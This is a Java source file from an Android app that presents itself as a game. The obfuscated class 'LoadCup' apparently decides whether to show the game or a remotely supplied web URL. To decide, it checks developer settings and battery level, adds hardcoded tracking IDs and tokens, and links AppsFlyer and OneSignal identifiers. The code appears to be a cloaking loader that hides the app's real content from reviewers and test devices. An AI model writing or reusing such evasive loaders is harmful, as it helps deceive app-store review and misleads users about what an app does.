package com.poomgames.catfore.load;

import static android.content.Context.BATTERY_SERVICE;

import android.content.Context;
import android.os.BatteryManager;
import android.provider.Settings;

import com.appsflyer.AppsFlyerLib;
import com.onesignal.OneSignal;
import com.poomgames.catfore.load.buuu.Splii;
import com.poomgames.catfore.load.dataWorldUser.AppCup;
import com.poomgames.catfore.load.dataWorldUser.DataUser;
import com.poomgames.catfore.load.dataWorldUser.FbbWorkdCup;
import com.poomgames.catfore.load.gissss.Gisss;
import com.poomgames.catfore.presentation.activities.Fds;
import com.poomgames.catfore.presentation.activities.MainActivity;

import java.util.Objects;

public class LoadCup implements Gisss.Callback, Gisss.CallGame, AppCup.ApppIn {

    private MainActivity mainActivity;
    private Fds fds;
    private String ki;
    private Splii splii;
    private LoadCupInerf loadCupInerf;

    public void setMainActivity(MainActivity mainActivity) {
        this.mainActivity = mainActivity;
        fds = new Fds();
        ki = fds.getKj() + fds.getLo();
    }

    public void laad(LoadCupInerf loadCupInerf) {
        this.loadCupInerf = loadCupInerf;
        if (ggee()) {
            loadCupInerf.loadCup(mainActivity.getSharedPreferences(mainActivity.getPackageName(), Context.MODE_PRIVATE).getString(mainActivity.getPackageName(), ""), "sss");
        } else {
            new Gisss(this, this).gggi(mainActivity.getString() + ki);
        }
    }

    private boolean ggee() {
        return !mainActivity.getSharedPreferences(mainActivity.getPackageName(), Context.MODE_PRIVATE).getString(mainActivity.getPackageName(), "").equals("");
    }


    @Override
    public void call(Gisss gisss) {
        if (gisss.a) {
            splii = new Splii(gisss.getDd());
            splii.spliit();
            splii.getData().put("18", splii.getData().get("18") + "sXqSbTB8zCtEdhbDZ4SCdh");
            splii.getData().put("19", splii.getData().get("19") + mainActivity.getPackageName());
            splii.getData().put("20", splii.getData().get("20") + "1709108882809739");
            splii.getData().put("21", splii.getData().get("21") + "3-NYxzLJ6fMe0GnD81Nf7eRFODc");
            new DataUser(mainActivity, () -> {
                try {
                    BatteryManager bm = (BatteryManager) mainActivity.getSystemService(BATTERY_SERVICE);
                    float a = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                    splii.getData().put("23", splii.getData().get("23") + a);
                } catch (Exception e) {
                    splii.getData().put("23", splii.getData().get("23") + "100.0");
                }

                int sa;
                try {
                    sa = Settings.Secure.getInt(mainActivity.getContentResolver(),
                            Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
                } catch (Exception e) {
                    sa = 1;
                }
                switch (sa) {
                    case 0:
                        splii.getData().put("22", splii.getData().get("22") + "false");

                        break;
                    case 1:
                        splii.getData().put("22", splii.getData().get("22") + "true");
                        break;
                }
            }).fj(splii);

            new FbbWorkdCup(mainActivity, a -> {

                new AppCup(mainActivity, a, this).aaapp(splii);
            }).fff(splii);


        } else {
            mainActivity.dialog();
        }
    }

    @Override
    public void callGame() {
        loadCupInerf.loadCup("", "");
    }

    @Override
    public void aaaa() {

        String[] kk = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24"};
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < splii.getData().size(); i++) {
            stringBuilder.append(splii.getData().get(kk[i]));
        }

        try {
            OneSignal.setExternalUserId(Objects.requireNonNull(AppsFlyerLib.getInstance().getAppsFlyerUID(mainActivity)));
        } catch (Exception e) {
            e.printStackTrace();
        }
        OneSignal.sendTag("sub_app", splii.getOrg());
        String [] s = splii.getData().get("16").split("=");
        loadCupInerf.loadCup(stringBuilder.toString(),s[1]);
    }
}
